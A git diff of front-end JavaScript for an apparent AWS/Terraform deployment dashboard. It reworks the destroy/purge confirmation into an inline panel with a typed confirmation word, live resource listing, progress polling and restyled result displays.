+                        <input type="text" id="${inputId}" placeholder="${confirmWord}" style="width: 100%; padding: 8px 10px; background: var(--bg-input); border: 1px solid var(--border); border-radius: var(--radius); color: var(--text-primary); font-size: 0.95em; box-sizing: border-box;">
+                    </div>
+                    <div style="display: flex; gap: 8px; align-self: flex-end;">
+                        <button onclick="hideDestroyConfirmation('${projectName}')" class="btn btn-secondary" style="font-size: 0.82em; padding: 8px 14px;">Cancel</button>
+                        <button id="${btnId}" onclick="executeDestroyConfirmation('${projectName}', '${mode}')" class="btn" style="background: ${btnColor}; color: white; font-size: 0.82em; padding: 8px 14px; opacity: 0.5; cursor: not-allowed;" disabled>
+                            ${isPurge ? '🧹 Purge' : '🗑️ Destroy'}
+                        </button>
+                    </div>
                 </div>
-            </div>
-            <div style="padding: 15px 20px; border-top: 1px solid var(--border); display: flex; justify-content: flex-end; gap: 10px;">
-                <button onclick="closePurgeReviewModal()" class="btn btn-secondary">Cancel</button>
-                <button id="purge-confirm-btn" onclick="executePurgeFromModal('${projectName}', '${mode}')" class="btn" style="background: ${btnColor}; color: var(--text-inverse); opacity: 0.5; cursor: not-allowed;" disabled>
-                    ${isPurge ? '🧹 Purge' : '🗑️ Destroy'}
-                </button>
             </div>
         </div>
     `;
 
-    document.body.appendChild(modal);
+    container.style.display = 'block';
+
+    // Animate open after a frame so the transition triggers
+    requestAnimationFrame(() => {
+        const inner = container.firstElementChild;
+        if (inner) {
+            inner.style.maxHeight = inner.scrollHeight + 'px';
+            inner.style.opacity = '1';
+            // After transition completes, remove max-height so async content can expand freely
+            inner.addEventListener('transitionend', function handler(e) {
+                if (e.propertyName === 'max-height') {
+                    inner.style.maxHeight = 'none';
+                    inner.removeEventListener('transitionend', handler);
+                }
+            });
+        }
+    });
 
     // Enable confirm button only when correct word is typed
-    const input = document.getElementById('purge-confirm-input');
-    const btn = document.getElementById('purge-confirm-btn');
+    const input = document.getElementById(inputId);
+    const btn = document.getElementById(btnId);
     input.addEventListener('input', () => {
         const match = input.value.trim() === confirmWord;
         btn.disabled = !match;
@@ -4086,41 +9652,116 @@ function showPurgeReviewModal(projectName, resources, mode = 'purge') {
     });
     input.focus();
 
-    // Close on backdrop click
-    modal.addEventListener('click', (e) => {
-        if (e.target === modal) closePurgeReviewModal();
-    });
+    // Fetch live resources from AWS (DOM is now populated)
+    fetchDestroyResources(projectName);
 }
 
-function closePurgeReviewModal() {
-    const modal = document.getElementById('purge-review-modal');
-    if (modal) modal.remove();
+function hideDestroyConfirmation(projectName) {
+    const container = document.getElementById(`destroy-confirm-${projectName}`);
+    if (!container) return;
+    const inner = container.firstElementChild;
+    if (inner) {
+        // Pin to current height, disable transition momentarily so the pin is instant
+        inner.style.transition = 'none';
+        inner.style.maxHeight = inner.scrollHeight + 'px';
+        // Force reflow so the pinned height is applied before we re-enable transition
+        inner.offsetHeight;
+        inner.style.transition = 'max-height 0.3s ease, opacity 0.3s ease';
+        inner.style.maxHeight = '0px';
+        inner.style.opacity = '0';
+        inner.addEventListener('transitionend', function handler() {
+            container.style.display = 'none';
+            container.innerHTML = '';
+            inner.removeEventListener('transitionend', handler);
+        });
+    } else {
+        container.style.display = 'none';
+        container.innerHTML = '';
+    }
 }
 
 /**
- * Execute the purge/destroy after modal confirmation
+ * Fetch live resources from AWS for the destroy confirmation panel
  */
-async function executePurgeFromModal(projectName, mode) {
-    closePurgeReviewModal();
+async function fetchDestroyResources(projectName) {
+    const container = document.getElementById(`destroy-resources-${projectName}`);
+    if (!container) return;
 
-    const overviewDiv = document.getElementById('deployments-overview');
+    try {
+        const response = await fetch(`${API_BASE}/deploy/resources/project/${encodeURIComponent(projectName)}?refresh=true`);
+        const data = await response.json();
+        const resources = data.resources || [];
+
+        if (resources.length > 0) {
+            const rows = resources.map(r => {
+                const stateLabel = r.state ? ` <span style="color: var(--text-muted); font-size: 0.8em;">(${r.state})</span>` : '';
+                return `<tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 6px 10px;">${awsIcon(r.type, 18)} <span style="text-transform: uppercase; font-size: 0.88em;">${r.type}</span></td>
+                    <td style="padding: 6px 10px; color: var(--text-primary);">${r.name || '-'}${stateLabel}</td>
+                    <td style="padding: 6px 10px;"><code class="code-inline" style="font-size: 0.88em;">${r.id || '-'}</code></td>
+                </tr>`;
+            }).join('');
+            container.innerHTML = `
+                <p style="color: var(--text-secondary); margin-bottom: 8px; font-size: 0.9em;"><strong>${resources.length} resource${resources.length !== 1 ? 's' : ''}</strong> found in AWS for this project:</p>
+                <div style="max-height: 200px; overflow-y: auto; border: 1px solid var(--border); border-radius: var(--radius);">
+                    <table style="width: 100%; border-collapse: collapse; font-size: 0.85em;">
+                        <thead><tr style="background: var(--bg-section);">
+                            <th style="padding: 6px 10px; text-align: left; color: var(--text-secondary);">Type</th>
+                            <th style="padding: 6px 10px; text-align: left; color: var(--text-secondary);">Name</th>
+                            <th style="padding: 6px 10px; text-align: left; color: var(--text-secondary);">ID</th>
+                        </tr></thead>
+                        <tbody>${rows}</tbody>
+                    </table>
+                </div>
+                <p style="margin-top: 6px; font-size: 0.78em; color: var(--text-muted);">Live from AWS · Terraform state may include additional resources (IAM policies, route table associations, data sources) not shown here.</p>`;
+        } else {
+            container.innerHTML = `
+                <div style="padding: 10px; background: var(--warning-bg); border-left: 3px solid var(--warning); border-radius: var(--radius-sm);">
+                    <p style="margin: 0; color: var(--warning-text); font-size: 0.88em;">No tagged resources found in AWS. Terraform state may still contain resources to clean up.</p>
+                </div>`;
+        }
+    } catch (e) {
+        container.innerHTML = `
+            <div style="padding: 10px; background: var(--warning-bg); border-left: 3px solid var(--warning); border-radius: var(--radius-sm);">
+                <p style="margin: 0; color: var(--warning-text); font-size: 0.88em;">Could not fetch live resources: ${e.message}. Terraform will still destroy all resources in its state.</p>
+            </div>`;
+    }
+
+}
+
+/**
+ * Execute the destroy/purge after inline confirmation
+ */
+async function executeDestroyConfirmation(projectName, mode) {
+    const container = document.getElementById(`destroy-confirm-${projectName}`);
     const isPurge = mode === 'purge';
     const endpoint = isPurge ? 'purge' : 'destroy';
     const confirmWord = isPurge ? 'PURGE' : 'DESTROY';
     const label = isPurge ? 'Purge' : 'Destroy';
 
-    if (overviewDiv) {
-        overviewDiv.innerHTML = `
-            <div class="status-display warning" style="padding: 20px;">
-                <div style="display: flex; align-items: center; gap: 15px;">
-                    <div class="spinner"></div>
-                    <div>
-                        <p style="margin: 0; font-weight: bold;">🧹 Starting ${label} for ${projectName}...</p>
-                        <p style="margin: 5px 0 0 0; font-size: 0.9em; color: var(--text-secondary);">Running terraform ${isPurge ? 'refresh + destroy' : 'destroy'}...</p>
+    // Prevent auto-refresh and timeline rebuilds from wiping the inline progress UI
+    window._destroyInProgress = true;
+    stopAutoRefresh();
+
+    // Replace confirmation panel content with progress UI (stay inline)
+    if (container) {
+        container.innerHTML = `
+            <div style="margin-top: 15px; border: 2px solid var(--warning); border-radius: 8px; overflow: hidden;">
+                <div style="padding: 14px 18px; background: var(--warning-bg); display: flex; justify-content: space-between; align-items: center;">
+                    <span style="font-weight: 700; color: var(--warning-text); font-size: 0.95em;">${label} in Progress — ${projectName}</span>
+                </div>
+                <div id="destroy-progress-${projectName}" style="padding: 16px 18px; background: var(--bg-card);">
+                    <div style="display: flex; align-items: center; gap: 15px;">
+                        <div class="spinner"></div>
+                        <div>
+                            <p style="margin: 0; font-weight: bold;">Starting ${label}...</p>
+                            <p style="margin: 5px 0 0 0; font-size: 0.9em; color: var(--text-secondary);">Running terraform ${isPurge ? 'refresh + destroy' : 'destroy'}...</p>
+                        </div>
                     </div>
                 </div>
             </div>
         `;
+        container.style.display = 'block';
     }
 
     disableDeployButton(true, `${label} in progress...`);
@@ -4141,16 +9782,22 @@ async function executePurgeFromModal(projectName, mode) {
         if (data.success) {
             pollDestructionStatus(projectName);
         } else {
-            if (overviewDiv) {
-                overviewDiv.innerHTML = `<div class="status-display error"><p><strong>Error:</strong> ${data.error || 'Unknown error'}</p></div>`;
+            const progressDiv = document.getElementById(`destroy-progress-${projectName}`);
+            if (progressDiv) {
+                progressDiv.innerHTML = `<div class="status-display error" style="margin: 0;"><p><strong>Error:</strong> ${data.error || 'Unknown error'}</p></div>`;
             }
             disableDeployButton(false);
+            window._destroyInProgress = false;
+            startAutoRefresh();
         }
     } catch (error) {
-        if (overviewDiv) {
-            overviewDiv.innerHTML = `<div class="status-display error"><p><strong>Error:</strong> ${error.message}</p></div>`;
+        const progressDiv = document.getElementById(`destroy-progress-${projectName}`);
+        if (progressDiv) {
+            progressDiv.innerHTML = `<div class="status-display error" style="margin: 0;"><p><strong>Error:</strong> ${error.message}</p></div>`;
         }
         disableDeployButton(false);
+        window._destroyInProgress = false;
+        startAutoRefresh();
     }
 }
 
@@ -4160,6 +9807,11 @@ async function executePurgeFromModal(projectName, mode) {
  */
 function pollDestructionStatus(projectName = null) {
     const trackedProject = projectName || window.currentDeploymentProject || null;
+
+    // Clear any previous destroy poll before starting a new one
+    if (window._destroyPollInterval) {
+        clearInterval(window._destroyPollInterval);
+    }
 
     const pollInterval = setInterval(async () => {
         try {
@@ -4173,46 +9825,60 @@ function pollDestructionStatus(projectName = null) {
 
             if (data.success && data.status) {
                 const status = data.status;
-                const overviewDiv = document.getElementById('deployments-overview');
+                // Render inline in the deployment card's destroy container
+                const progressDiv = trackedProject
+                    ? document.getElementById(`destroy-progress-${trackedProject}`)
+                    : null;
 
                 if (status.status === 'running') {
-                    // Still destroying - show progress with recent logs
-                    if (overviewDiv) {
+                    if (progressDiv) {
                         let logsHtml = '';
                         if (status.logs && status.logs.length > 0) {
-                            const recentLogs = status.logs.slice(-8);
                             logsHtml = `
-                                <div style="background: var(--bg-terminal); color: var(--text-secondary); padding: 12px; border-radius: 6px; font-family: monospace; font-size: 0.88em; margin-top: 15px; max-height: 200px; overflow-y: auto;">
-                                    ${recentLogs.map(log => {
+                                <div id="destroy-logs-${trackedProject}" class="terminal-block" style="font-size: 0.88em; margin-top: 15px; max-height: 300px; overflow-y: auto;">
+                                    ${status.logs.map(log => {
                                         const time = new Date(log.timestamp * 1000).toLocaleTimeString();
-                                        const color = log.type === 'error' ? 'var(--danger-text)' :
-                                                      log.type === 'success' ? 'var(--success-text)' :
-                                                      log.type === 'warning' ? 'var(--warning-text)' : 'var(--accent-muted)';
-                                        return `<div style="margin-bottom: 4px;"><span style="color: var(--text-muted);">[${time}]</span> <span style="color: ${color};">${log.message}</span></div>`;
+                                        const color = log.type === 'error' ? '#F08A84' :
+                                                      log.type === 'success' ? '#7ECF8C' :
+                                                      log.type === 'warning' ? '#E8C56D' : '#8BB4D9';
+                                        return `<div style="margin-bottom: 4px;"><span style="color: #7A849E;">[${time}]</span> <span style="color: ${color};">${log.message}</span></div>`;
                                     }).join('')}
                                 </div>`;
                         }
 
-                        overviewDiv.innerHTML = `
-                            <div class="status-display warning" style="padding: 20px;">
-                                <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 10px;">
-                                    <div class="spinner"></div>
-                                    <div>
-                                        <p style="margin: 0; font-weight: bold;">🧹 ${status.step || 'Purging resources...'}</p>
-                                        <p style="margin: 5px 0 0 0; font-size: 0.9em; color: var(--text-secondary);">
-                                            Progress: ${status.progress_percent || 0}% &bull; Elapsed: ${status.elapsed_formatted || '0m 0s'}
-                                        </p>
-                                    </div>
+                        // Capture scroll position before re-render
+                        const existingLogs = document.getElementById(`destroy-logs-${trackedProject}`);
+                        const wasAtBottom = existingLogs
+                            ? (existingLogs.scrollHeight - existingLogs.scrollTop - existingLogs.clientHeight < 30)
+                            : true;
+
+                        const pct = status.progress_percent || 0;
+                        progressDiv.innerHTML = `
+                            <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 10px;">
+                                <div class="spinner"></div>
+                                <div style="flex: 1;">
+                                    <p style="margin: 0; font-weight: bold;">${status.step || 'Destroying resources...'}</p>
+                                    <p style="margin: 5px 0 0 0; font-size: 0.9em; color: var(--text-secondary);">
+                                        Elapsed: ${status.elapsed_formatted || '0m 0s'}
+                                    </p>
                                 </div>
-                                ${logsHtml}
-                            </div>`;
+                            </div>
+                            <div style="background: var(--bg-section); border-radius: 4px; height: 6px; margin-bottom: 8px; overflow: hidden;">
+                                <div style="height: 100%; width: ${pct}%; background: var(--brand); border-radius: 4px; transition: width 0.5s ease;"></div>
+                            </div>
+                            ${logsHtml}`;
+
+                        // Auto-scroll logs to bottom if user was near the bottom
+                        if (wasAtBottom) {
+                            const newLogs = document.getElementById(`destroy-logs-${trackedProject}`);
+                            if (newLogs) newLogs.scrollTop = newLogs.scrollHeight;
+                        }
                     }
 
                 } else if (status.status === 'success') {
                     clearInterval(pollInterval);
                     disableDeployButton(false);
 
-                    // Log purge results to Deployment History
                     const pr = status.purge_result;
                     if (pr) {
                         const destroyed = pr.terraform_destroyed_count || 0;
@@ -4231,16 +9897,30 @@ function pollDestructionStatus(projectName = null) {
                         );
                     }
 
-                    if (overviewDiv) {
-                        overviewDiv.innerHTML = buildPurgeResultHtml(status, trackedProject, 'success');
+                    // Render final result inline in the deployment card
+                    const container = trackedProject
+                        ? document.getElementById(`destroy-confirm-${trackedProject}`)
+                        : null;
+                    if (container) {
+                        container.innerHTML = `
+                            <div style="margin-top: 15px; border: 2px solid var(--success); border-radius: 8px; overflow: hidden;">
+                                <div style="padding: 14px 18px; background: var(--success-bg, rgba(126,207,140,0.1)); display: flex; justify-content: space-between; align-items: center;">
+                                    <span style="font-weight: 700; color: var(--success-text); font-size: 0.95em;">Destroy Complete — ${trackedProject}</span>
+                                    <button onclick="window._destroyInProgress=false; refreshAll();" style="background: none; border: none; color: var(--text-secondary); font-size: 18px; cursor: pointer; padding: 0 4px; line-height: 1;">&times;</button>
+                                </div>
+                                <div style="padding: 16px 18px; background: var(--bg-card);">
+                                    ${buildPurgeResultContent(status, trackedProject, 'success')}
+                                </div>
+                            </div>`;
                     }
-                    refreshAfterAction();
+                    // Keep _destroyInProgress true so timeline doesn't rebuild and wipe results
+                    // It gets cleared when user dismisses the result panel
+                    loadResourceList();
 
                 } else if (status.status === 'error') {
                     clearInterval(pollInterval);
                     disableDeployButton(false);
 
-                    // Log purge failure to Deployment History
                     const pr2 = status.purge_result;
                     const errMsg = status.error || 'Unknown error';
                     if (pr2) {
@@ -4259,14 +9939,29 @@ function pollDestructionStatus(projectName = null) {
                         );
                     }
 
-                    if (overviewDiv) {
-                        overviewDiv.innerHTML = buildPurgeResultHtml(status, trackedProject, 'error');
+                    const container = trackedProject
+                        ? document.getElementById(`destroy-confirm-${trackedProject}`)
+                        : null;
+                    if (container) {
+                        container.innerHTML = `
+                            <div style="margin-top: 15px; border: 2px solid var(--danger); border-radius: 8px; overflow: hidden;">
+                                <div style="padding: 14px 18px; background: var(--danger-bg); display: flex; justify-content: space-between; align-items: center;">
+                                    <span style="font-weight: 700; color: var(--danger-text); font-size: 0.95em;">Destroy Failed — ${trackedProject}</span>
+                                    <button onclick="window._destroyInProgress=false; refreshAll();" style="background: none; border: none; color: var(--text-secondary); font-size: 18px; cursor: pointer; padding: 0 4px; line-height: 1;">&times;</button>
+                                </div>
+                                <div style="padding: 16px 18px; background: var(--bg-card);">
+                                    ${buildPurgeResultContent(status, trackedProject, 'error')}
+                                </div>
+                            </div>`;
                     }
-                    refreshAfterAction();
+                    loadResourceList();
 
                 } else {
                     clearInterval(pollInterval);
+                    window._destroyPollInterval = null;
                     disableDeployButton(false);
+                    window._destroyInProgress = false;
+                    startAutoRefresh();
                     refreshAll();
                 }
             }
@@ -4274,19 +9969,18 @@ function pollDestructionStatus(projectName = null) {
             console.error('Error polling destruction status:', error);
         }
     }, 3000);
+    window._destroyPollInterval = pollInterval;
 }
 
 /**
- * Build the HTML for purge/destroy result display (success or error).
+ * Build the inner content HTML for purge/destroy result display (success or error).
+ * Returns content without an outer wrapper — the caller provides the container.
  * Shows: 3-column stats grid, destroyed resources list, remaining resources warning, errors, full logs.
  */
-function buildPurgeResultHtml(status, trackedProject, outcome) {
+function buildPurgeResultContent(status, trackedProject, outcome) {
     const pr = status.purge_result;
     const isSuccess = outcome === 'success';
-    const cssClass = isSuccess ? 'success' : 'error';
-    const title = isSuccess ? '&#10004; Purge Completed' : '&#10060; Purge Failed';
 
-    // Build structured summary if purge_result is available
     let summaryHtml = '';
     let destroyedListHtml = '';
     let remainingHtml = '';
@@ -4296,31 +9990,36 @@ function buildPurgeResultHtml(status, trackedProject, outcome) {
         const beforeCount = pr.resources_before || 0;
         const destroyedCount = pr.terraform_destroyed_count || 0;
         const afterCount = pr.resources_after || 0;
+        const filteredDead = pr.filtered_dead || 0;
 
-        // 3-column stats grid
+        const filteredNote = filteredDead > 0 ? `
+            <p style="margin: 0 0 12px 0; font-size: 0.82em; color: var(--text-muted);">
+                ${filteredDead} terminated/deleted resource${filteredDead !== 1 ? 's' : ''} excluded from count (AWS retains tags temporarily after deletion)
+            </p>` : '';
+
         summaryHtml = `
+            ${filteredNote}
             <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin: 15px 0;">
                 <div style="background: var(--bg-terminal); padding: 12px; border-radius: 6px; text-align: center;">
-                    <div style="font-size: 1.6em; color: var(--text-secondary); font-weight: bold;">${beforeCount}</div>
-                    <div style="font-size: 0.88em; color: var(--text-muted);">Before</div>
+                    <div style="font-size: 1.6em; color: var(--text-terminal); font-weight: bold;">${beforeCount}</div>
+                    <div style="font-size: 0.88em; color: var(--text-terminal); opacity: 0.6;">Before</div>
                 </div>
                 <div style="background: var(--bg-terminal); padding: 12px; border-radius: 6px; text-align: center;">
-                    <div style="font-size: 1.6em; color: var(--success-text); font-weight: bold;">${destroyedCount}</div>
-                    <div style="font-size: 0.88em; color: var(--text-muted);">Destroyed</div>
+                    <div style="font-size: 1.6em; color: #7ECF8C; font-weight: bold;">${destroyedCount}</div>
+                    <div style="font-size: 0.88em; color: var(--text-terminal); opacity: 0.6;">Destroyed</div>
                 </div>
                 <div style="background: var(--bg-terminal); padding: 12px; border-radius: 6px; text-align: center;">
-                    <div style="font-size: 1.6em; color: ${afterCount > 0 ? 'var(--warning-text)' : 'var(--success-text)'}; font-weight: bold;">${afterCount}</div>
-                    <div style="font-size: 0.88em; color: var(--text-muted);">Remaining</div>
+                    <div style="font-size: 1.6em; color: ${afterCount > 0 ? '#F0CA4A' : '#7ECF8C'}; font-weight: bold;">${afterCount}</div>
+                    <div style="font-size: 0.88em; color: var(--text-terminal); opacity: 0.6;">Remaining</div>
                 </div>
             </div>`;
 
-        // Collapsible destroyed resources list
         if (pr.terraform_destroyed && pr.terraform_destroyed.length > 0) {
             const rows = pr.terraform_destroyed.map(d =>
-                `<div style="padding: 3px 0; border-bottom: 1px solid rgba(255,255,255,0.05);">
-                    <span style="color: var(--success-text);">&#10003;</span>
-                    <code style="color: var(--accent-muted);">${d.address}</code>
-                    <span style="color: var(--text-muted); font-size: 0.88em;">(${d.duration})</span>
+                `<div style="padding: 3px 0; border-bottom: 1px solid rgba(176,184,204,0.1);">
+                    <span style="color: #7ECF8C;">&#10003;</span>
+                    <code class="t-terminal">${d.address}</code>
+                    <span style="color: var(--text-terminal); opacity: 0.6; font-size: 0.88em;">(${d.duration})</span>
                 </div>`
             ).join('');
             destroyedListHtml = `
@@ -4328,29 +10027,42 @@ function buildPurgeResultHtml(status, trackedProject, outcome) {
                     <summary style="cursor: pointer; color: var(--success-text); font-weight: bold;">
                         ${destroyedCount} resource${destroyedCount !== 1 ? 's' : ''} destroyed
                     </summary>
-                    <div style="background: var(--bg-terminal); padding: 10px; border-radius: 6px; margin-top: 6px; max-height: 250px; overflow-y: auto; font-family: monospace; font-size: 0.88em;">
+                    <div class="terminal-block" style="font-size: 0.88em; margin-top: 6px; max-height: 250px; overflow-y: auto;">
                         ${rows}
                     </div>
                 </details>`;
         }
 
-        // Remaining resources warning
         if (afterCount > 0) {
             const breakdown = Object.entries(pr.resources_after_by_service || {})
                 .sort((a, b) => b[1] - a[1])
                 .map(([svc, count]) => `${count} ${svc}`)
                 .join(', ');
+            const remainingList = pr.resources_after_list || [];
+            const resourceRows = remainingList.length > 0
+                ? `<div class="terminal-block" style="margin-top: 8px; max-height: 150px; overflow-y: auto;">
+                    ${remainingList.map(r => {
+                        const name = r.resource_id || r.arn || 'unknown';
+                        const svc = r.service || '';
+                        const rtype = r.resource_type || '';
+                        return `<div style="padding: 3px 0; border-bottom: 1px solid rgba(255,255,255,0.05); color: var(--text-terminal);">
+                            <span style="color: #F0CA4A;">&#9724;</span>
+                            <span style="color: #F0CA4A;">${svc}/${rtype}</span>
+                            <span style="color: var(--text-terminal); opacity: 0.8;">${name}</span>
+                        </div>`;
+                    }).join('')}
+                </div>` : '';
             remainingHtml = `
                 <div style="margin-top: 12px; padding: 10px; background: rgba(143, 164, 100, 0.1); border-left: 3px solid var(--warning-text); border-radius: 4px;">
-                    <strong style="color: var(--warning-text);">&#9888; ${afterCount} resource${afterCount !== 1 ? 's' : ''} still remain</strong>
+                    <strong class="t-warning">&#9888; ${afterCount} resource${afterCount !== 1 ? 's' : ''} still remain</strong>
                     <span style="color: var(--text-secondary); font-size: 0.9em;"> (${breakdown})</span>
+                    ${resourceRows}
                     <p style="margin: 8px 0 0 0; font-size: 0.88em; color: var(--text-muted);">
                         These may take a few minutes to fully deregister, or may require manual cleanup.
                     </p>
                 </div>`;
         }
 
-        // Terraform errors
         if (pr.terraform_errors && pr.terraform_errors.length > 0) {
             errorsHtml = `
                 <details ${isSuccess ? '' : 'open'} style="margin-top: 12px;">
@@ -4366,7 +10078,6 @@ function buildPurgeResultHtml(status, trackedProject, outcome) {
         }
     }
 
-    // Collapsible full logs
     let logsHtml = '';
     if (status.logs && status.logs.length > 0) {
         logsHtml = `
@@ -4374,27 +10085,25 @@ function buildPurgeResultHtml(status, trackedProject, outcome) {
                 <summary style="cursor: pointer; color: var(--text-secondary);">
                     Full logs (${status.logs.length} entries)
                 </summary>
-                <div style="background: var(--bg-terminal); color: var(--text-secondary); padding: 12px; border-radius: 6px; font-family: monospace; font-size: 0.88em; margin-top: 6px; max-height: 300px; overflow-y: auto;">
+                <div class="terminal-block" style="font-size: 0.88em; margin-top: 6px; max-height: 300px; overflow-y: auto;">
                     ${status.logs.map(log => {
                         const time = new Date(log.timestamp * 1000).toLocaleTimeString();
-                        const color = log.type === 'error' ? 'var(--danger-text)' :
-                                      log.type === 'success' ? 'var(--success-text)' :
-                                      log.type === 'warning' ? 'var(--warning-text)' : 'var(--accent-muted)';
-                        return `<div style="margin-bottom: 4px; ${log.type === 'error' ? 'background: var(--danger-bg); padding: 4px; border-radius: 3px;' : ''}"><span style="color: var(--text-muted);">[${time}]</span> <span style="color: ${color};">${log.message}</span></div>`;
+                        const color = log.type === 'error' ? '#F08A84' :
+                                      log.type === 'success' ? '#7ECF8C' :
+                                      log.type === 'warning' ? '#E8C56D' : '#8BB4D9';
+                        return `<div style="margin-bottom: 4px; ${log.type === 'error' ? 'background: rgba(240,138,132,0.1); padding: 4px; border-radius: 3px;' : ''}"><span style="color: #7A849E;">[${time}]</span> <span style="color: ${color};">${log.message}</span></div>`;
                     }).join('')}
                 </div>
             </details>`;
     }
 
-    // Error message (only for error outcome)
     const errorMsgHtml = !isSuccess && status.error
         ? `<p style="font-size: 0.9em; color: var(--text-secondary); margin-top: 8px;">${escapeHtml((status.error || '').substring(0, 500))}</p>`
         : '';
 
-    // Action buttons
     const retryBtn = (pr && pr.resources_after > 0) || !isSuccess
-        ? `<button class="btn" onclick="purgeFailedDeployment('${trackedProject || ''}')" style="background: var(--danger); color: var(--text-primary); margin-left: 10px;">
-               🧹 ${isSuccess ? 'Retry Remaining' : 'Try Again'}
+        ? `<button class="btn" onclick="showDestroyConfirmation('${trackedProject || ''}', 'purge')" style="background: var(--danger); color: white; margin-left: 10px;">
+               ${isSuccess ? 'Retry Remaining' : 'Try Again'}
            </button>`
         : '';
 
@@ -4402,23 +10111,20 @@ function buildPurgeResultHtml(status, trackedProject, outcome) {
         ? `<button class="btn btn-success" onclick="APP.navigateTo('deployment')">Deploy New Infrastructure &rarr;</button>`
         : `<button class="btn btn-secondary" onclick="refreshAll()">Refresh All</button>`;
 
-    const dismissBtn = `<button class="btn btn-secondary" onclick="refreshAll()" style="margin-left: 10px;">Dismiss</button>`;
+    const dismissBtn = `<button class="btn btn-secondary" onclick="window._destroyInProgress=false; startAutoRefresh(); refreshAll();" style="margin-left: 10px;">Dismiss</button>`;
 
     return `
-        <div class="status-display ${cssClass}" style="padding: 20px;">
-            <p><strong>${title}</strong></p>
-            ${errorMsgHtml}
-            ${summaryHtml}
-            ${destroyedListHtml}
-            ${remainingHtml}
-            ${errorsHtml}
-            ${logsHtml}
-            <p style="margin-top: 15px;">
-                ${deployBtn}
-                ${retryBtn}
-                ${dismissBtn}
-            </p>
-        </div>`;
+        ${errorMsgHtml}
+        ${summaryHtml}
+        ${destroyedListHtml}
+        ${remainingHtml}
+        ${errorsHtml}
+        ${logsHtml}
+        <p style="margin-top: 15px;">
+            ${deployBtn}
+            ${retryBtn}
+            ${dismissBtn}
+        </p>`;
 }
 
 /**
@@ -4437,11 +10143,11 @@ async function appendInstanceStateSummary(containerSelector) {
         if (active.length === 0) return;
 
         const stateIcon = (state) => {
-            if (state === 'running') return '<span style="color: var(--success-text);">&#9679;</span>';
-            if (state === 'stopped') return '<span style="color: var(--warning-text);">&#9724;</span>';
-            if (state === 'stopping') return '<span style="color: var(--warning-text);">&#9660;</span>';
-            if (state === 'pending') return '<span style="color: var(--info-text);">&#9650;</span>';
-            return '<span style="color: var(--text-muted);">&#9675;</span>';
+            if (state === 'running') return '<span class="t-success">&#9679;</span>';
+            if (state === 'stopped') return '<span class="t-warning">&#9724;</span>';
+            if (state === 'stopping') return '<span class="t-warning">&#9660;</span>';
+            if (state === 'pending') return '<span class="t-info">&#9650;</span>';
+            return '<span class="t-muted">&#9675;</span>';
         };
 
         const stateLabel = (state) => {
@@ -4468,8 +10174,8 @@ async function appendInstanceStateSummary(containerSelector) {
             <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                 <strong style="color: var(--text-secondary); font-size: 0.9em;">Current Instance States</strong>
                 <span style="font-size: 0.85em; color: var(--text-muted);">
-                    <span style="color: var(--success-text);">${running} running</span>
-                    ${stopped > 0 ? ` &middot; <span style="color: var(--warning-text);">${stopped} stopped</span>` : ''}
+                    <span class="t-success">${running} running</span>
+                    ${stopped > 0 ? ` &middot; <span class="t-warning">${stopped} stopped</span>` : ''}
                 </span>
             </div>
             <div style="font-family: monospace; font-size: 0.88em;">${rows}</div>
@@ -4535,8 +10241,8 @@ async function stopInfrastructure() {
             // Build instance details list
             const instanceList = (data.instances || []).map(i =>
                 `<div style="padding: 4px 0; border-bottom: 1px solid rgba(255,255,255,0.05);">
-                    <span style="color: var(--warning-text);">&#9724;</span>
-                    <strong style="color: var(--text-primary);">${escapeHtml(i.name)}</strong>
+                    <span class="t-warning">&#9724;</span>
+                    <strong class="t-primary">${escapeHtml(i.name)}</strong>
                     <span style="color: var(--text-muted); font-size: 0.88em;">(${i.id} &middot; ${i.type})</span>
                 </div>`
             ).join('');
@@ -4546,7 +10252,7 @@ async function stopInfrastructure() {
                     <summary style="cursor: pointer; color: var(--warning-text); font-weight: bold;">
                         ${data.stopped_count} instance${data.stopped_count !== 1 ? 's' : ''} stopped
                     </summary>
-                    <div style="background: var(--bg-terminal); padding: 10px; border-radius: 6px; margin-top: 6px; font-family: monospace; font-size: 0.88em;">
+                    <div class="terminal-block" style="font-size: 0.88em; margin-top: 6px;">
                         ${instanceList}
                     </div>
                 </details>`;
@@ -4642,8 +10348,8 @@ async function startInfrastructure() {
             // Build instance details list
             const instanceList = (data.instances || []).map(i =>
                 `<div style="padding: 4px 0; border-bottom: 1px solid rgba(255,255,255,0.05);">
-                    <span style="color: var(--success-text);">&#9654;</span>
-                    <strong style="color: var(--text-primary);">${escapeHtml(i.name)}</strong>
+                    <span class="t-success">&#9654;</span>
+                    <strong class="t-primary">${escapeHtml(i.name)}</strong>
                     <span style="color: var(--text-muted); font-size: 0.88em;">(${i.id} &middot; ${i.type})</span>
                 </div>`
             ).join('');
@@ -4653,7 +10359,7 @@ async function startInfrastructure() {
                     <summary style="cursor: pointer; color: var(--success-text); font-weight: bold;">
                         ${data.started_count} instance${data.started_count !== 1 ? 's' : ''} starting
                     </summary>
-                    <div style="background: var(--bg-terminal); padding: 10px; border-radius: 6px; margin-top: 6px; font-family: monospace; font-size: 0.88em;">
+                    <div class="terminal-block" style="font-size: 0.88em; margin-top: 6px;">
                         ${instanceList}
                     </div>
                 </details>` : '';
@@ -4762,8 +10468,8 @@ async function stopDeploymentResources(projectName) {
 
             const instanceList = (data.instances || []).map(i =>
                 `<div style="padding: 4px 0; border-bottom: 1px solid rgba(255,255,255,0.05);">
-                    <span style="color: var(--warning-text);">&#9724;</span>
-                    <strong style="color: var(--text-primary);">${escapeHtml(i.name)}</strong>
+                    <span class="t-warning">&#9724;</span>
+                    <strong class="t-primary">${escapeHtml(i.name)}</strong>
                     <span style="color: var(--text-muted); font-size: 0.88em;">(${i.id} &middot; ${i.type})</span>
                 </div>`
             ).join('');
@@ -4773,7 +10479,7 @@ async function stopDeploymentResources(projectName) {
                     <summary style="cursor: pointer; color: var(--warning-text); font-weight: bold;">
                         ${data.stopped_count} instance${data.stopped_count !== 1 ? 's' : ''} stopped
                     </summary>
-                    <div style="background: var(--bg-terminal); padding: 10px; border-radius: 6px; margin-top: 6px; font-family: monospace; font-size: 0.88em;">
+                    <div class="terminal-block" style="font-size: 0.88em; margin-top: 6px;">
                         ${instanceList}
                     </div>
                 </details>`;
